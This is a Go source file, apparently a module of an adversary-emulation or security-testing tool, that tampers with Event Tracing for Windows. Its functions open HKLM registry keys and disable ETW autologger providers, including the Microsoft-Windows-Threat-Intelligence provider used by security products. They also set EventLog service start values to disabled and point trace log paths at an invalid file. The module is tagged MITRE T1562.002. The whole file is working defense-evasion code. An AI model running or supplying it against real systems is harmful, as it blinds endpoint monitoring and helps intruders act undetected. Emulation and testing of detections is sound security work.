package modules

import (
	"agentide/core"
	"golang.org/x/sys/windows/registry"
	"time"
)

// disableETWTamperModule attempts to disable ETW (Event Tracing for Windows)
// using additional techniques beyond the autologger registry keys.
// This includes disabling ETW providers directly, modifying ETW session settings,
// and tampering with ETW session trace files.
type disableETWTamperModule struct {
	logger *core.Logger
	cfg    *core.Config
}

func (m *disableETWTamperModule) Name() string { return "disable_etw_tamper" }

func (m *disableETWTamperModule) Run() RawResult {
	start := time.Now()
	result := RawResult{
		ModuleName: m.Name(),
		MitreID:    "T1562.002", // Disable Windows Event Logging - ETW tampering
		Action:     "Attempt to tamper with ETW sessions and providers beyond autologgers",
	}

	disabledCount := 0
	var details []string

	// Technique 1: Disable ETW providers directly via registry
	if m.disableETWProvidersDirect() {
		disabledCount++
		details = append(details, "ETW providers disabled directly via registry")
	}

	// Technique 2: Disable ETW real-time consumer sessions
	if m.disableETWRealTimeConsumers() {
		disabledCount++
		details = append(details, "ETW real-time consumers disabled")
	}

	// Technique 3: Set ETW session trace file to invalid path
	if m.corruptETWTraceFiles() {
		disabledCount++
		details = append(details, "ETW trace files corrupted")
	}

	// Technique 4: Disable Microsoft-Windows-Threat-Intelligence specifically
	if m.disableThreatIntelligenceETW() {
		disabledCount++
		details = append(details, "Microsoft Threat Intelligence ETW disabled")
	}

	result.ElapsedMs = time.Since(start).Milliseconds()

	if disabledCount > 0 {
		result.Notes = "ETW tampering successful: " + joinStrings(details, "; ")
		result.OSFeedback.ProcessKilled = false
		result.OSFeedback.AccessDenied = false
	} else {
		result.Notes = "All ETW tampering attempts resisted"
		result.OSFeedback.AccessDenied = true
	}

	return result
}

// disableETWProvidersDirect disables ETW providers by setting their Enable property to 0
func (m *disableETWTamperModule) disableETWProvidersDirect() bool {
	providers := []string{
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Threat-Intelligence`,
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Kernel-Process`,
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Kernel-Image`,
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Kernel-Thread`,
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Kernel-Network`,
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Kernel-Registry`,
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Kernel-File`,
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Kernel-Process`,
	}

	for _, path := range providers {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
		if err != nil {
			continue
		}

		// Disable by setting Start = 0
		err = k.SetDWordValue("Start", 0)
		k.Close()
		if err == nil {
			return true
		}
	}
	return false
}

// disableETWRealTimeConsumers disables real-time ETW consumers
func (m *disableETWTamperModule) disableETWRealTimeConsumers() bool {
	consumerPaths := []string{
		`SYSTEM\CurrentControlSet\Services\EventLog\System\Microsoft-Windows-Threat-Intelligence`,
		`SYSTEM\CurrentControlSet\Services\EventLog\System\Microsoft-Windows-Kernel-Process`,
	}

	success := false
	for _, path := range consumerPaths {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
		if err != nil {
			continue
		}

		err = k.SetDWordValue("Start", 4)
		k.Close()
		if err == nil {
			success = true
		}
	}
	return success
}

// corruptETWTraceFiles sets ETW trace file paths to invalid locations
func (m *disableETWTamperModule) corruptETWTraceFiles() bool {
	tracePaths := []string{
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Threat-Intelligence`,
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Circular Kernel Context Logger`,
	}

	for _, path := range tracePaths {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
		if err != nil {
			continue
		}

		err = k.SetStringValue("LogFilePath", `C:\Windows\Temp\invalid_etw_trace.etl`)
		k.Close()
		if err == nil {
			return true
		}
	}
	return false
}

// disableThreatIntelligenceETW specifically targets Microsoft Threat Intelligence ETW
func (m *disableETWTamperModule) disableThreatIntelligenceETW() bool {
	paths := []string{
		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Threat-Intelligence`,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Threat-Intelligence`,
		`SYSTEM\CurrentControlSet\Services\EventLog\System\Microsoft-Windows-Threat-Intelligence`,
	}

	success := false
	for _, path := range paths {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
		if err != nil {
			continue
		}

		// Disable via multiple methods
		err = k.SetDWordValue("Start", 0)
		if err == nil {
			success = true
		}

		err = k.SetDWordValue("Enabled", 0)
		if err == nil {
			success = true
		}

		err = k.SetStringValue("LogFilePath", `C:\Windows\Temp\invalid_etw_trace.etl`)
		if err == nil {
			success = true
		}

		k.Close()
		if success {
			return true
		}
	}
	return false
}

